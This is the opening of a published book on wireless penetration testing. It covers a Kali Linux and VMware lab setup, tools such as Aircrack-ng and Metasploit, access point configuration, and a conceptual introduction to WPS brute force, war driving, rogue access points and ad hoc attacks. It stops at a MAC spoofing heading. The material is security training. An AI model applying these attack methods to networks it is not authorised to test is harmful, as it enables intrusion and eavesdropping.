![](images/cover.jpg)

![image](images/cover.jpg)

# Wireless  
Penetration Testing:  
Up and Running

![](images/line.jpg)

# *Run Wireless Networks Vulnerability Assessment,  
Wi-Fi Pen Testing, Android and iOS Application  
Security, and Break WEP, WPA, and WPA2 Protocols*

![](images/line.jpg)

# Dr. Ahmed Hashem El Fiky

![](images/logo.jpg)

[www.bpbonline.com](http://www.bpbonline.com)

Copyright © 2023 BPB Online

*All rights reserved.* No part of this book may be reproduced, stored in a retrieval system, or transmitted in any form or by any means, without the prior written permission of the publisher, except in the case of brief quotations embedded in critical articles or reviews.

Every effort has been made in the preparation of this book to ensure the accuracy of the information presented. However, the information contained in this book is sold without warranty, either express or implied. Neither the author, nor BPB Online or its dealers and distributors, will be held liable for any damages caused or alleged to have been caused directly or indirectly by this book.

BPB Online has endeavored to provide trademark information about all of the companies and products mentioned in this book by the appropriate use of capitals. However, BPB Online cannot guarantee the accuracy of this information.

**First published:** 2023

Published by BPB Online

WeWork, 119 Marylebone Road

London NW1 5PU

**UK | UAE | INDIA | SINGAPORE**

ISBN 978-93-5551-275-8

**[www.bpbonline.com](http://www.bpbonline.com)**

# Dedicated to

*My beloved Parents :*

***Hashem El Fiky***

***&***

***Mona El Fiky***

# About the Author

**Dr. Ahmed Hashem El Fiky** has done his Masters in Cyber Security. Currently, he is enrolled in the Doctor of Business Administration Program. He has a total of 8+ years of experience in various domains such as Reverse Engineering, Malware Analysis, Web Penetration Testing, Mobile Penetration Testing, Network Penetration Testing, Wireless Penetration Testing, System Penetration Testing, and Machine Learning. The author has published 8 papers on Cyber Security Fields. Currently, he is working as a Senior Cyber Security Engineer. He also has professional certifications such as ECSA v10, CCNA, NSE4, ISO 27001 and so on.

# About the Reviewer

**Amar Gupta** is a Senior Engineer with more than 8 years of experience in the Cyber Security field. In his career, he has worked with multiple MNCs and gathered extensive experience in the field of security. He has vast experience in firewalls, proxies, load balancers and other network security components and has worked with fortune 500 companies to provide them top notch security solutions.

# Acknowledgement

There are a few people I want to thank for the continued and ongoing support they have given me during the writing of this book. First and foremost, I would like to thank my parents, my wife, and my daughter for continuously encouraging me to write the book — I could have never completed this book without their support.

I am grateful to the course and the companies which gave me support throughout the learning process of wireless penetration testing, as well as tools related to wireless penetration testing.

Thank you for all the hidden support provided. I gratefully acknowledge Mr. Amar Gupta for his kind technical scrutiny for this book.

My gratitude also goes to the team at BPB Publications for being supportive enough to provide me quite a long time to finish the first part of the book and also allow me to publish the book in multiple parts, since image processing, being a vast and very active area of research, was impossible to deep-dive into different class of problems in a single book.

# Preface

Since it is simple to access the Internet without a network cable from a variety of locations worldwide, wireless technology has grown in popularity. However, a wireless network may not always be secure if you are unaware of its risks and, more importantly, if security measures are not performed. For your own safety, it is crucial to safeguard your wireless network. Over the past few years, there has been an increase in identity theft and the theft of personal information.

Insecure wireless networks are no longer safe since there is a higher chance that your personal information may be stolen, despite the fact that they are simpler to set up and connect to. Another person with little to no experience can intercept it with ease. Another option for a user to keep tabs on your online activity, includes an unprotected wireless network. This includes conversations, emails, and even your online banking account. Although this book offers ways to safeguard wireless networks, it mostly concentrates on how an attacker can access a protected wireless network. Additionally, it demonstrates the power an attacker has, once they have access to a wireless network.

This book is divided into **12 chapters**. They will cover wireless Network basics, basics and advances in wireless penetration testing. The details are listed as follows.

**[Chapter 1](#c01.xhtml)** will cover step-by-step directions for setting up your own wireless lab. It will also cover the fundamentals of installing Kali on your hard drive and experimenting with virtual machines (VMWare). This chapter will provide knowledge about wireless penetration testing tools, such as Wireshark and Aircrack-ng. It will discuss how to use the Web interface to configure your access point.

**[Chapter 2](#c02.xhtml)** will cover a complete understanding of numerous different wireless attack strategies, such as access control attacks, confidential attacks, credential attacks, and authentication attacks.

**[Chapter 3](#c03.xhtml)** will discuss how to scan wireless networks for information, as well as show two different forms of wireless scanning and how they function. The chapter will then show how to use Ettercap to sniff wireless networks using ARP poisoning and how to use dsniff to gather login details. Finally, it will cover a variety of ways to defend yourself against these attacks.

**[Chapter 4](#c04.xhtml)** will show how to make a plan for an attack. Next, it will cover several methods for an attack. Then, the chapter will discuss detailed information on WEP, WPA, and WPA2 encryption. Finally, it will cover learn several ways to reduce the risk of a wireless attack.

**[Chapter 5](#c05.xhtml)** will illustrate why it is important to find the number of live hosts when conducting a penetration test on a network. Next, it will cover identifying hosts on the network with Kali Linux. Lastly, the chapter will cover determining network size.

**[Chapter 6](#c06.xhtml)** will cover the ability to plan out an assessment, the key components of an assessment, and the step-by-step process of an assessment. It will cover the ability to install Nessus, register it, download plugins, and then run Nessus. The chapter will also discuss the ability to create a new policy and scan, identify vulnerabilities, read the vulnerability details, and follow it up with a solution for the vulnerability.

**[Chapter 7](#c07.xhtml)** will cover learn how to capture unencrypted traffic and gain an understanding of honeypot attacks and methods, Karmetasploit, Jasager, and prevention from threats.

**[Chapter 8](#c08.xhtml)** will cover the basics of conducting advanced attacks using wireless, where it will create a setup for a MITM attack over wireless and then use it to eavesdrop on the victim’s traffic. Then, the chapter will discuss how the same setup can be used to hijack the application layer of the victim (Web traffic, to be specific) using a DNS poisoning attack as well as how to use Metasploit. Finally, will discuss the prevention of these threats.

**[Chapter 9](#c09.xhtml)** will cover the ability to learn how to use first and double pivoting to investigate hidden networks and the mitigations methods.

**[Chapter 10](#c10.xhtml)** will cover understanding Android architecture in detail, how to set up an android penetration testing environment and know the popular android penetration testing tools. Finally, it will discuss how to protect your Android applications.

**[Chapter 11](#c11.xhtml)** will cover the ability to understand the basics of iOS applications, iOS application sandboxing structure and the popular iOS penetration testing tools. Finally, the chapter will go over the testing methodology of the iOS application.

**[Chapter 12](#c12.xhtml)** will cover the ability to understand how to write a professional penetration testing report.

# Code Bundle and Coloured Images

Please follow the link to download the  
***Code Bundle*** and the ***Coloured Images*** of the book:

# [https://rebrand.ly/qn0i995](https://rebrand.ly/qn0i995)

The code bundle for the book is also hosted on GitHub at **[https://github.com/bpbpublications/Wireless-Penetration-Testing-Up-and-Running](https://github.com/bpbpublications/Wireless-Penetration-Testing-Up-and-Running)**. In case there's an update to the code, it will be updated on the existing GitHub repository.

We have code bundles from our rich catalogue of books and videos available at **[https://github.com/bpbpublications](https://github.com/bpbpublications)**. Check them out!

# Errata

We take immense pride in our work at BPB Publications and follow best practices to ensure the accuracy of our content to provide with an indulging reading experience to our subscribers. Our readers are our mirrors, and we use their inputs to reflect and improve upon human errors, if any, that may have occurred during the publishing processes involved. To let us maintain the quality and help us reach out to any readers who might be having difficulties due to any unforeseen errors, please write to us at :

**[errata@bpbonline.com](mailto:errata@bpbonline.com)**

Your support, suggestions and feedbacks are highly appreciated by the BPB Publications’ Family.

Did you know that BPB offers eBook versions of every book published, with PDF and ePub files available? You can upgrade to the eBook version at **[www.bpbonline.com](http://www.bpbonline.com)** and as a print book customer, you are entitled to a discount on the eBook copy. Get in touch with us at: **[business@bpbonline.com](mailto:business@bpbonline.com)** for more details.

At **[www.bpbonline.com](http://www.bpbonline.com)**, you can also read a collection of free technical articles, sign up for a range of free newsletters, and receive exclusive discounts and offers on BPB books and eBooks.

# Piracy

If you come across any illegal copies of our works in any form on the internet, we would be grateful if you would provide us with the location address or website name. Please contact us at [**business@bpbonline.com**](mailto:business@bpbonline.com) with a link to the material.

# If you are interested in becoming an author

If there is a topic that you have expertise in, and you are interested in either writing or contributing to a book, please visit [**www.bpbonline.com**.](http://www.bpbonline.com/) We have worked with thousands of developers and tech professionals, just like you, to help them share their insights with the global tech community. You can make a general application, apply for a specific hot topic that we are recruiting an author for, or submit your own idea.

# Reviews

Please leave a review. Once you have read and used this book, why not leave a review on the site that you purchased it from? Potential readers can then see and use your unbiased opinion to make purchase decisions. We at BPB can understand what you think about our products, and our authors can see your feedback on their book. Thank you!

For more information about BPB, please visit [**www.bpbonline.com**.](http://www.bpbonline.com/)

# [CHAPTER 1](#toc.xhtml#c01)

# [Wireless Penetration Testing Lab Setup](#toc.xhtml#c01)

# [Introduction](#toc.xhtml#s1a)

This book provides useful information to protect you. We cannot guarantee your 100% safety. It provides what administrators need to understand about the potential security threats that can occur at any time. As you know, there are risks while dealing with data, as anyone can access the data that is unauthorized to access it.

This chapter will focus on the benefits of advanced wireless penetration testing and the skills needed to use it so that you will understand the upcoming chapters. There are also key factors in this chapter that must be understood, such as understanding Kali Linux, knowledge of wireless cards, and some important tools that must be used.

**Question**: Why do we test for penetration in wireless networks?

**Answer**:

*   To avoid network data breaches that cost organizations millions of dollars because of viruses, worms, Trojan horses, and illegal activities, wireless penetration testing helps us avoid these risks before they occur.
*   To assess security vulnerabilities in terms of importance, we can rank or identify the most important threats to the organization and prevent attacks before they occur.
*   To set regulations and policies to protect employees.

The best benefit of wireless penetration testing is security awareness, as it is very important to understand how attackers penetrate these networks and what they can do just to gain access to them.

**Question:** What are attackers looking for on your system or network? Is the data valuable or not?

Always ask yourself in the form of *What if*? For example, why would an attacker gain access to his online bank account? Could he buy anything? What if the attacker obtains security clearance for your workplace? Could he cause harm to your business? These are just a few examples.

**Remember that** this book is designed to focus on advanced wireless hacking news. It will focus on understanding the hidden principles behind various attacks on wireless networks. You will learn the following:

*   Detailed understanding of wireless network security.
*   How to find weaknesses in wireless networks and how to introduce different types of Wi-Fi attacks. It will also explain the best security practices to follow when setting up a wireless network.

**Question:** Who should read this book?

**Answer:** Who will be interested in this book? Certainly not for everyone, but I hope it will be for most network administrators or information security professionals. This book will provide hack prevention methods in nearly every chapter. I think prevention coverage is very important because you will not only know how to protect yourself but also the threats that exist in the real world.

**All large or small wireless networks serve the same use, which is access to a network via a wireless frequency (without cable), whether the device is a computer or a mobile phone. In our society today, we see more users being hacked, especially in Wi-Fi networks. There may be some problems in Wi-Fi networks, such as there may be an open wireless network, there may be weak encryption, or they are maybe minor authentication problems.**

# [Structure](#toc.xhtml#s2a)

In this chapter, we will discuss the following topics:

*   Hardware requirements
*   Software requirements
*   Downloading and installing Kali Linux
*   Wireless penetration testing tools
*   Configuring an access point setting
*   Installing Wireless Adaptor
*   Connecting to the access point

# [Objectives](#toc.xhtml#s3a)

This chapter gives you step-by-step directions for setting up your own wireless lab. You will also learn the fundamentals of installing Kali on your hard drive and experimenting with virtual machines (VMWare) and take some knowledge about wireless penetration testing tools such as Wireshark and Aircrack-ng. You will also learn how to use the Web interface to configure your access point. Finally, you will learn how to configure and use your wireless adaptor, and you must first learn and perform numerous commands for verifying the status of the wireless client’s connection to the access point.

# [Hardware requirements](#toc.xhtml#s4a)

To set up the wireless lab, we will need the following hardware:

*   **Two laptops with internal Wi-Fi cards:** In our lab, we will use one laptop as the victim and the other as the penetration tester’s laptop. Though practically any laptop will do, laptops with at least 4 GB of RAM are preferred because our trials may include a lot of memory-intensive software.
*   **One Wireless Adapters:** Depending on your laptop’s wireless card, we may require a USB Wi-Fi card that supports packet injection and sniffing, which Kali supports. The Alfa AWUS036H card from Alfa Networks appears to be the best option. Refer to *[Figure 1.1](#c01.xhtml#fig1_1)*:

![](images/Figure-1.1.jpg)

**Figure 1.1:** Alfa AWUS036H wireless adaptor

The TP-Link N150 Wireless High Gain USB Adapter (TLWN722N), as shown in *[Figure 1.2](#c01.xhtml#fig1_2)*, Panda 300Mbps Wireless N USB Adapter, and Edimax EW7711UAN are all smaller and slightly less expensive alternatives.

![](images/Figure-1.2.jpg)

**Figure 1.2:** TLWN722N wireless adaptor

*   **One access point**: Any access point that supports the encryption technologies WEP/WPA/WPA2 will suffice. For the purposes of example in this book, we will be using a NETGEAR D1500 Wireless router.
*   **An active internet connection**: This will assist with research, software downloads, and some of our experiments.

# [Software requirements](#toc.xhtml#s5a)

To set up the wireless lab, we will need the following software:

*   **Virtual machine platforms such as VMware or VirtualBox**: Because of their widespread use, virtualization software is a desirable alternative for setting up your testing machine on a virtualized platform. The bother of dual booting the computer is eliminated by virtualization software, which offers a robust set of functions at a low price. Cloning virtual machines, which allows you to make numerous clones of the same system, is another practical function that the majority of virtualization software products offer. In a practical penetration test, you may need to clone and replicate your testing computer in order to install more hacking tools and update Kali Linux configuration settings, preserving a copy of the earlier image to be used as a base image in a virtualized environment. This is pretty simple to accomplish.
*   **Kali Linux**: The official website for Kali is **[https://www.kali.org/](https://www.kali.org/)**, where you may download the program. You should be able to get the program directly from the website because it is open source.
*   **Windows 7/Windows 8/Windows 8.1/Windows 10/Windows 11**: On one of the laptops, you will need to have Windows 7, Windows 8, Windows 8.1, Windows 10, or Windows 11 installed. For the remainder of the book, this laptop will serve as the victim machine.

**It is worth noting that while we are testing on a Windows-based OS, the concepts we have learned may be applied to any Wi-Fi-capable device, including smartphones and tablets, as we will discuss toward the end of the book (*[Chapter 11: iOS Penetration Testing](#c11.xhtml)* and *[Chapter 12: Reporting](#c12.xhtml)*).**

# [Downloading and installing Kali Linux](#toc.xhtml#s6a)

Kali Linux (formerly known as BackTrack Linux) is an open-source, Debian-based Linux distribution aimed at advanced penetration testing and security auditing. Kali Linux contains several hundred tools targeted toward various information security tasks, such as penetration testing, security research, computer forensics, and reverse engineering. Kali Linux is a multi-platform solution, accessible and freely available to information security professionals and hobbyists.

Kali Linux was released on March 13, 2013, as a complete, top-to-bottom rebuild of BackTrack Linux, adhering completely to Debian development standards. Let us get started with the Kali Linux download and installation if your machine is 64-bit, as shown in *[Figure 1.3](#c01.xhtml#fig1_3)*. Where we will use a 64-bit Kali Linux Machine; else, if your machine is 32-bit, you need to download Kali Linux 32-bit, and you can install the Kali Linux 32-bit like 64-bit on a Virtual machine platform.

Kali Linux download procedure (we recommend the image marked Installer) is as shown in *[Figure 1.3](#c01.xhtml#fig1_3)*:

![](images/Figure-1.3.jpg)

**Figure 1.3:** Kali Linux download

# [Installing Kali Linux inside VMware (Guest VM) step-by-step](#toc.xhtml#s7a)

To install Kali Linux inside VMware (Guest VM), follow the given steps:

1.  Upon starting up VMware Workstation, select `Create a New Virtual Machine`, as shown in *[Figure 1.4](#c01.xhtml#fig1_4)*: 
    
    ![](images/Figure-1.4.jpg)
    
    **Figure 1.4:** Create a new virtual machine
    
2.  Select `Custom (advanced)` for the Virtual Machine Configuration when you have the option, as this will provide us with greater control over the VM creation. Refer to *[Figure 1.5](#c01.xhtml#fig1_5)*: 
    
    ![](images/Figure-1.5.jpg)
    
    **Figure 1.5:** Virtual machine configuration
    
3.  The next screen is `Virtual Machine Hardware Compatibility`, in which we use `Workstation 8.x`, as shown in *[Figure 1.6](#c01.xhtml#fig1_6)*: 
    
    ![](images/Figure-1.6.jpg)
    
    **Figure 1.6:** Virtual machine hardware compatibility
    
4.  If this is your first time using the wizard, you may be presented with the following prompt, which explains how adding `VMware tools` can improve your VM experience. Before pressing close, you might want to check the `Don’t show this page again` box after reading and comprehending the page, as shown in *[Figure 1.7](#c01.xhtml#fig1_7)*: 
    
    ![](images/Figure-1.7.jpg)
    
    **Figure 1.7:** Install VMware tools
    
5.  By choosing `Edit virtual machine settings`, we may now edit the VM’s settings before it starts up, as shown in *[Figure 1.8](#c01.xhtml#fig1_8)*: 
    
    ![](images/Figure-1.8.jpg)
    
    **Figure 1.8:** Edit virtual machine settings
    
6.  We have no use for a printer; therefore, we get rid of it. To remove a printer, go to the `Printer` section and hit `Remove`, as shown in *[Figure 1.9](#c01.xhtml#fig1_9)*: 
    
    ![](images/Figure-1.9.jpg)
    
    **Figure 1.9:** Remove the printer device
    
7.  If you want to change how USB devices behave, you can change the `USB` settings. We have turned off `Automatically connect new USB devices` (this option may not be available depending on your VMware version) and turned on `Show all USB input devices`, as shown in *[Figure 1.10](#c01.xhtml#fig1_10)*: 
    
    ![](images/Figure-1.10.jpg)
    
    **Figure 1.10:** USB settings
    
8.  There is one more thing to mention in the `Display` section. Make sure `Accelerated 3D graphics` is turned off, as it has been documented to create problems, as shown in *[Figure 1.11](#c01.xhtml#fig1_11)*: 
    
    ![](images/Figure-1.11.jpg)
    
    **Figure 1.11:** Display settings
    
9.  Next, we will go to the `Options` menu and scroll down to `Power`. We chose to allow `Report battery information to guests` since it is a useful feature for Kali users who use laptops or notebooks, as shown in *[Figure 1.12](#c01.xhtml#fig1_12)*: 
    
    ![](images/Figure-1.12.jpg)
    
    **Figure 1.12:** Power options
    
10.  We choose `Always enable` under `Shared folders` do not reveal any paths at this time, as some users may not want to, as shown in *[Figure 1.13](#c01.xhtml#fig1_13)*: 
     
     ![](images/Figure-1.13.jpg)
     
     **Figure 1.13:** Folder sharing settings
     
11.  Finally, we enable `Synchronize guest time with host` in the `VMware Tool` option, as shown in *[Figure 1.14](#c01.xhtml#fig1_14)*: 
     
     ![](images/Figure-1.14.jpg)
     
     **Figure 1.14:** VMware tools features
     
12.  After that, we save, start the VM, and then continue installing Kali Linux using the `Graphical Install` option, as shown in *[Figure 1.15](#c01.xhtml#fig1_15)*: 
     
     ![](images/Figure-1.15.jpg)
     
     **Figure 1.15:** Kali Linux graphical install
     

# [Wireless penetration testing tools](#toc.xhtml#s8a)

The following sections describe various useful and widely used security tools.

# [Wireshark](#toc.xhtml#s9a)

Wireshark is a packet analyzer that is both free and open source. It can be used for network troubleshooting, analysis, software development, and communications protocol development. Wireshark may also be used as a teaching tool to demonstrate the importance of using SSL or other encryption methods to safeguard sensitive information like usernames and passwords from being captured by an outside attacker. Kali Linux comes with Wireshark pre-installed.

**How can Wireshark be of assistance to you? Wireshark can sniff wireless packets, follow TCP streams, and discover unwanted wireless access points to obtain access to e-mails, passwords, and other sensitive information.**

*[Figure 1.16](#c01.xhtml#fig1_16)* shows the Wireshark interface:

![](images/Figure-1.16.jpg)

**Figure 1.16:** Wireshark

# [Scapy](#toc.xhtml#s10a)

Scapy is a packet manipulation application with a lot of capabilities. It is capable of forging or decoding packets from a wide range of protocols. It transmits packets, captures them, compares requests, and responds. Scanning, tracerouting, probing, assaults, and network discovery are all easy activities that it can readily do. Hoping, 85% of Nmap, arpspoof, tcpdump, tethereal, p0f, and other tools might be readily replaced. It can also handle a variety of other jobs that other programs cannot, such as sending incorrect frames, injecting your own 802.11 frames, combining VLAN hopping, ARP cache poisoning, WEP VOIP decoding, and more. Scapy is shown in action with Kali Linux, as shown in *[Figure 1.17](#c01.xhtml#fig1_17)*:

![](images/Figure-1.17.jpg)

**Figure 1.17:** Scapy

# [Nmap](#toc.xhtml#s11a)

Nmap is a network discovery and security auditing tool that is free and open source. It is useful for activities such as network inventory, scheduling service upgrade schedules, and monitoring host or service uptime for many systems and network managers. Nmap is a tool that may be used to detect Linux operating system versions and binary packages. It can also detect whether a network port is open or closed. Kali Linux comes with Nmap pre-installed.

Nmap is a network and subnet mapping tool. It can also tell you what operating systems and software versions you are running. This can assist in determining whether the network has a flaw or a potential security issue. Nmap is shown in action with Kali Linux, as shown in *[Figure 1.18](#c01.xhtml#fig1_18):*

![](images/Figure-1.18.jpg)

**Figure 1.18:** Nmap

# [Aircrack-ng](#toc.xhtml#s12a)

Aircrack-ng is a C-based software that interfaces with a security auditing suite. Airodump-ng, aircrack-ng, aireplay-ng, Nmap, dnsiff, arpspoof, urlsnarf, and more utilities are included in Aircrack-ng. Although Aircrack-ng has the potential to be used maliciously, it can also be used to recover forgotten Wi-Fi passwords. For security pros, Aircrack-ng is an excellent tool. Not just to mention that it is completely free to use and distribute! Kali Linux comes with Aircrack-ng pre-installed, as shown in *[Figure 1.19](#c01.xhtml#fig1_19)*:

![](images/Figure-1.19.jpg)

**Figure 1.19:** Aircrack-ng

# [Metasploit](#toc.xhtml#s13a)

Metasploit is a Ruby-based software that helps to reduce the risk of data breaches. It can use the same approaches as an outside attacker to find weaknesses in your network and systems. Metasploit can find thousands of flaws in a wide range of systems and software. Kali Linux comes with Metasploit already installed, as shown in *[Figure 1.20](#c01.xhtml#fig1_20).*

**What role does Metasploit play in wireless penetration testing? Metasploit contains a vulnerability database. If a wireless router has a vulnerability that can be exploited by bypassing the admin login, Metasploit will almost certainly have a Ruby script for it. It also works on operating systems and hardware firewalls, so it is not just for wireless routers. Metasploit’s search command can be used to find CVEs.**

![](images/Figure-1.20.jpg)

**Figure 1.20:** Metasploit

# [Configuring an access point setting](#toc.xhtml#s14a)

We are going to set up the access point now. As previously stated, all of the experiments in this book will be conducted using the NETGEAR D1500 Wireless Router. You may, however, use any other access point. The core operating and usage principles remain the same.

With an SSID of Wireless Lab, we will configure the access point to use Open Authentication. Follow the given steps:

1.  Connect your laptop to one of the access point’s Ethernet ports with an Ethernet cable after turning on the access point.
2.  In your browser, type the IP address of the access point configuration terminal. The default IP address for the NETGEAR is `192.168.1.1`. The IP address of your access point can be found in the setup guide for your access point. If you do not have the access point’s manuals, you can use a Web browser to access the router at **[http://routerlogin.net](http://routerlogin.net)**. The access point’s IP address is usually used as the gateway IP address. You should see a configuration portal that looks like this once you’ve connected. Refer to *[Figure 1.21](#c01.xhtml#fig1_21)*: 
    
    ![](images/Figure-1.21.jpg)
    
    **Figure 1.21:** Wireless router login
    
    Both the username and password are admin by default. You must reset the router to its default configuration settings if you are unable to access it. To do this, push the button on the back of the wireless router for 5 seconds, and the router will be reset to its default settings.
    
3.  To rename the SSID to `Wireless Lab`, navigate to the `Wireless` tab, then `Wireless Settings`. *[Figure 1.22](#c01.xhtml#fig1_22)* is an example.
4.  As previously stated, the access point’s security settings must be changed to `Open Authentication`. Select `None` from the `Wireless` menu, then `Security` options. The access point is in `Open Authentication Mode` if security is disabled (see *[Figure 1.22](#c01.xhtml#fig1_22)*).
5.  Save the changes to the access point and, if necessary, reboot it. Your access point should now be operational using the SSID Wireless Lab. 
    
    ![](images/Figure-1.22.jpg)
    
    **Figure 1.22:** Wireless router settings
    

We have successfully configured our access point with a Wireless Lab SSID. It is announcing its presence, which is picked up by our Windows laptop and others within the access point’s **Radio Frequency** (**RF**) range.

It is worth noting that we set up our access point in `Open` mode, which is the least secure option. For the time being, it is not recommended to connect this access point to the internet because anyone within the RF range will be able to use it to access the internet.

# [Installing wireless adaptor](#toc.xhtml#s15a)

Our wireless adaptor is significantly easier to set up than the access point. The benefit is that Kali comes pre-installed with all the necessary device drivers to enable packet injection and sniffing right out of the box. The wireless adaptor will be used with the penetration tester’s laptop. To set up your card, follow these instructions step by step:

1.  Plugin the adaptor into one of the Kali laptop’s USB ports and boot it. Once you log in, open a console terminal and type in **iwconfig**. Your screen should look as shown in *[Figure 1.23](#c01.xhtml#fig1_23):*
    
    ![](images/Figure-1.23.jpg)
    
    **Figure 1.23:** iwconfig command
    
2.  As you can see, the wireless adapter’s wireless interface is named `wlan0.` To bring up the interface, type `ifconfig wlan0`, as shown in *[Figure 1.24](#c01.xhtml#fig1_24)*: 
    
    ![](images/Figure-1.24.jpg)
    
    **Figure 1.24:** ifconfig wlan0 command
    
3.  `1c:bf:ce:89:8c:e2` should be the same as the MAC address listed on your wireless adapter.

# [Connecting to the access point](#toc.xhtml#s16a)

Now, we will look at how to use the wireless adapter to connect to the access point. Wireless Lab is the SSID of our access point, and it does not use any authentication. To connect your wireless adaptor to the access point, follow these steps:

Let us have a look at the wireless networks that our adaptor can currently identify. You can get a list of nearby networks by running the command **iwlist wlan0 scanning**.

1.  Continue scrolling down until you see the Wireless Lab network listed. It is detected as `Cell 01` in my configuration; it may be different from yours. The network name is stored in the ESSID field, as shown in *[Figure 1.25](#c01.xhtml#fig1_25):*
    
    ![](images/Figure-1.25.jpg)
    
    **Figure 1.25:** iwlist wlan0 scanning command
    
2.  To check the status, run the commands `iwconfig wlan0 essid` **“**`Wireless Lab`**”** and `iwconfig wlan0`. If you successfully connected to the access point, the MAC address of the access point should appear in the Access Point: field of the `iwconfig` output, as shown in *[Figure 1.26](#c01.xhtml#fig1_26)*: 
    
    ![](images/Figure-1.26.jpg)
    
    **Figure 1.26:** iwconfig wlan0 essid “Wireless Lab” command
    
3.  According to the documentation, the access point’s management interface IP address is `192.168.1.1`. Alternatively, when we configured the access point, this was the default router IP address. Let us use the `ifconfig wlan0 192.168.1.3 netmask 255.255.255.0` up command to set our IP address in the same subnet. Type `ifconfig` **wlan0** and review the output to see if the command worked, as shown in *[Figure 1.27](#c01.xhtml#fig1_27)*: 
    
    ![](images/Figure-1.27.jpg)
    
    **Figure 1.27:** ifconfig wlan0 192.168.1.3 netmask 255.255.255.0 command
    
4.  Now, use the `ping 192.168.1.1` command to ping the access point. The answers from the access point should be visible if the network connection has been correctly set up, as shown in *[Figure 1.28](#c01.xhtml#fig1_28)*: 
    
    ![](images/Figure-1.28.jpg)
    
    **Figure 1.28:** Ping command
    
    We may check connectivity on the access point by looking at the connection logs. The MAC address of the wireless card `1c:bf:ce:89:8c:e2` has been logged making DHCP requests from the router, as shown in the accompanying log, as shown in *[Figure 1.29](#c01.xhtml#fig1_29):*
    
    ![](images/Figure-1.29.jpg)
    
    **Figure 1.29:** Wireless router attached devices
    

# [Conclusion](#toc.xhtml#s17a)

This chapter gave you step-by-step directions for setting up your own wireless lab. You also learned the fundamentals of installing Kali on your hard drive and experimenting with virtual machines (VMWare) and take some knowledge about wireless penetration testing tools such as Wireshark and Aircrack-ng. You also learned how to use the Web interface to configure your access point. Finally, you learned how to configure and use your wireless adaptor, and you must first learn and perform numerous commands for verifying the status of the wireless client’s connection to the access point.

Now, you are ready to move on to *[Chapter 2: Wireless Attacking Techniques and Methods](#c02.xhtml)*.

# [Questions](#toc.xhtml#s18a)

1.  Mention the famous adapters that are used in the wireless penetration testing process.
2.  What is Kali Linux?
3.  Mention the famous tools that are used in the wireless penetration testing process.

# [CHAPTER 2](#toc.xhtml#c02)

# [Wireless Attacking Techniques and Methods](#toc.xhtml#c02)

# [Introduction](#toc.xhtml#s19a)

In this second chapter of the book, we will presume that you either enjoyed the first chapter so much that you opted to keep reading or skipped it because you were satisfied with what you already knew. So, here is your first question, in any case. The usual person will get a wireless router but will not set up any wireless security. What makes you think that?

Of course, you already know this, but it is because the average user may be unaware of the device’s security features or safeguards, or they may be computer knowledgeable but unfamiliar with how to implement wireless security. This is where **Wi-Fi Protected Setup** (**WPS**) comes in.

WPS simplifies the setup of a wireless home network. The user simply presses a button on the wireless router, and the router configures a secure network for the user automatically. Isn’t that fantastic? Wrong! Most typical wireless routers are vulnerable to brute-force assaults. A WPS PIN is usually only a series of integers. Using brute-force approaches, an attacker can retrieve or crack the WPS PIN in just a few hours due to this security weakness.

Users are not the only ones that do this; businesses and ISPs are as well. They will just plug in the wireless router and push the WPS button, after which they will write down the key for you. This is terrible security, especially for a company network! Please change the username, modify the default password, disable remote management, and activate the firewall.

# [Structure](#toc.xhtml#s20a)

In this chapter, we will discuss the following topics:

*   Access control attacks
*   Confidential attacks
*   Credential attacks
*   Authentication attacks

# [Objectives](#toc.xhtml#s21a)

This chapter gives you a complete understanding of numerous different wireless attack strategies, such as access control attacks, confidential attacks, credential attacks, and authentication attacks. The important thing to remember here is to be aware of the dangers we face when connecting to wireless access points and the internet.

# [Access control attacks](#toc.xhtml#s22a)

WLAN access control measures such as AP MAC filters and 802.11 port access controls are used in access control attacks to enter a network via wireless or to evade WLAN access control, as shown in *[Figure 2.1](#c02.xhtml#fig2_1)*:

![](images/Figure-2.1.jpg)

**Figure 2.1:** WLAN access control

The following sections demonstrate some access control attacks.

# [War driving](#toc.xhtml#s23a)

War driving is a hacking method and has its origins in the movie War Games, which starred actor Matthew Broderick. In the movie, Broderick’s character dials every phone number in his local area to discover all existing computers. That evolved into a process of mapping access points, which involves attackers finding vulnerable or unsecured Wi-Fi networks. War driving was termed by computer security consultant Peter Shipley, who developed software that can interact with portable **Global Positioning Systems** (**GPS**). Simply, War driving is the process of locating wireless LANs by listening for beacons or issuing probe requests, which serves as a launchpad for subsequent attacks. This attack can be carried out with tools such as Airmon-ng, DStumbler, KisMAC, and NetStumbler. War driving normally involves two people: one driving the car and the other scanning the surroundings for wireless networks. They can set up GPS settings to locate these Wi-Fi spots and preserve them for future wireless attacks with the right software and applications, as shown in *[Figure 2.2](#c02.xhtml#fig2_2):*

![](images/Figure-2.2.jpg)

**Figure 2.2:** War driving diagram

# [Rogue access points](#toc.xhtml#s24a)

Any wireless **access point** (**AP**) that is placed on a network without authorization, and hence, is not maintained by the network administrator is known as a rogue access point (AP). Rogue access points are not protected in the same way that normal access points are. They are particularly dangerous because they are physically hidden behind a network firewall, allowing anyone with access to the AP to obtain access to the whole network. Rogue APs can be plugged directly into a firewall or network switch, a wall connection, or even other network devices and can be installed maliciously by an attacker or simply by an employee looking for their own Wi-Fi access. Rogue access points, on the other hand, can be used for several assaults, including denial of service, data theft, and malware deployment, as shown in *[Figure 2.3](#c02.xhtml#fig2_3):*

![](images/Figure-2.3.jpg)

**Figure 2.3:** Rouge access point

# [Ad hoc associations](#toc.xhtml#s25a)

Ad hoc connection assaults are a particularly nasty sort of attack in which the attacker (malicious user) uses a third-party legitimate user as a man-in-the-middle between the attacker’s device and the AP or other type of gateway.

The Ad hoc wireless network capability, which is essential for *device-in-the-middle* operations, may be deployed on both Windows and Linux computers and enables the establishment of ad-hoc (peer-to-peer) wireless links between client devices (without any additional network infrastructure such as AP). What you do behind the scenes is to build a virtual software AP on your PC, and the second device associates with the SSID you created (effectively making wireless links).

An Ad hoc attack would be described in the following scenario, as shown in *Figure* *2.4*. Let us pretend the attacker is one of Computers 2, 3, or 4. Computer 1 would be the victim (man-in-the-middle). This laptop will be the one that is running and providing wireless connectivity to the surrounding area and has another interface connected to the wired network for internet access.

Attackers might connect to Computer 1’s WLAN and then use it to route all traffic to the internet through this victim’s PC. From the perspective of the internet, Computer 1 appears to be the source of the traffic! Wireless linkages from Computer 1 to all attackers do not have to be Wi-Fi connections; they could be Bluetooth or any other sort of wireless technology that is supported by all parties involved in the communication attempt.

Refer to *[Figure 2.4](#c02.xhtml#fig2_4)*:

![](images/Figure-2.4.jpg)

**Figure 2.4:** Ad hoc associations

# [MAC spoofing](#toc.xhtml#s26a)

